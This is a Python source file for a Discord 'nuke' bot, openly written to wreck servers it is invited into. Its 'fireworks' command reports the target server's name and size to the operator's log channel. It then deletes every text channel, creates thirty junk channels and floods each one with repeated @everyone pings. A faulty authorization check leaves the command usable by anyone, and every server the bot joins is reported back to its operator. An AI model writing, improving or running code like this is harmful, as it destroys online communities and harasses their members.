import os, discord, json, asyncio
from discord.ext import commands

file = "main.json"
f = open('data.json')
data = json.load(f)

token = data["token"]
busy = False
MAIN_SERVER = 1156317385087778897
protected_server = [MAIN_SERVER, ]

nuking = False
nukingGuild=False

client = commands.Bot(command_prefix="+", intents=discord.Intents.all())

async def is_protected(guild):
    for server in protected_server:
        if guild.id == server:
            return True
    else:
        return False

async def check_authorized(user):
    guild_id = 1156317385087778897
    guild = client.get_guild(guild_id)
    authorized_role = discord.utils.get(guild.roles, name="Authorized")
    
    if authorized_role in user.roles:
        return True
    else:
        return False

@client.event
async def on_ready():
    log = await client.fetch_channel(1156741597153730652)
    await log.send(embed=discord.Embed(
        title="New Event",
        description="I am now alive!",
        color=discord.Color.red()
    ))

@client.command()
async def add_protected(ctx, id: int):
    guild = await client.fetch_guild(id)
    already_protected = await is_protected(guild)

    if already_protected != False:
        await ctx.reply(embed=discord.Embed(
            title="Error",
            description=f"**{guild.name}** is already protected."
        ))
    else:
        pass

    protected_server.append(id)
    await ctx.reply(discord.Embed(
        title="Protected Server Addition",
        description=f"**{guild.name}** has been added to the protection list."
    ))


@client.event
async def on_guild_join(guild):
    log = await client.fetch_channel(1156317779843108864)

    log_embed = discord.Embed(
        title="Guild Join",
        description="This is public info for non-whitelisted individuals.\n*You are not receiving full detail.*",
        color=discord.Color.red()
    )
    log_embed.add_field(name="Name",value=guild.name)
    log_embed.add_field(name="Members",value=guild.member_count)
    log_embed.add_field(name="Channels",value=len(guild.text_channels))

    await log.send("@everyone", embed=log_embed)

@client.command()
async def check_status(ctx):
    user=ctx.author
    authorized = await check_authorized(user)

    if authorized != True:
        await ctx.reply(embed=discord.Embed(
            title="Authorization Status",
            description="You are **not authorized.**",
            color=discord.Color.brand_red()
        ))
    else:
        await ctx.reply(embed=discord.Embed(
            title="Authorization Status",
            description="You are **authorized.**",
            color=discord.Color.brand_red()
        ))

@client.command()
async def fireworks(ctx):
    protected = await is_protected(ctx.guild)
    if protected != False:
        await ctx.reply(embed=discord.Embed(
            title="You are not allowed to use this command here.",
            description="Access Denied.. dumbass",
            color=discord.Color.brand_red()
        ))
        return
    
    nuking=True
    global nukingGuild
    nukingGuild=ctx.guild.id

    print(nuking)
    print(nukingGuild)

    authorized = await check_authorized(ctx.author)
    log = await client.fetch_channel(1156741597153730652)
    guild = ctx.guild
    if authorized != True:
        await ctx.reply(embed=discord.Embed(
            title="Authorization Denied",
            description="You are **not authorized.**",
            color=discord.Color.brand_red()
        ))
    else:
        pass

    log_embed = discord.Embed(
        title="Fireworks have been unleashed!",
        description=f"I mean.. rip to {ctx.guild.member_count} members..",
        color=discord.Color.brand_red()
    )
    log_embed.add_field(name="Name",value=guild.name)
    log_embed.add_field(name="Members",value=guild.member_count)
    log_embed.add_field(name="Channels",value=len(guild.text_channels))
    log_embed.add_field(name="Voice Channels",value=len(guild.voice_channels))
    log_embed.add_field(name="Roles",value=len(guild.roles))

    await log.send("@everyone", embed=log_embed)

    for channel in guild.text_channels:
        await channel.delete()
        await asyncio.sleep(.25)

    for i in range(30):
        await guild.create_text_channel(name="dam")


@client.event
async def on_guild_channel_create(channel):
    print(f"GUILD -> {nukingGuild}")
    print(f"CHANNEL -> {channel.guild.id}")
    if channel.guild.id==nukingGuild:
        for i in range(25):
            await channel.send("😔 @everyone")
            await asyncio.sleep(.15)




client.run(token)
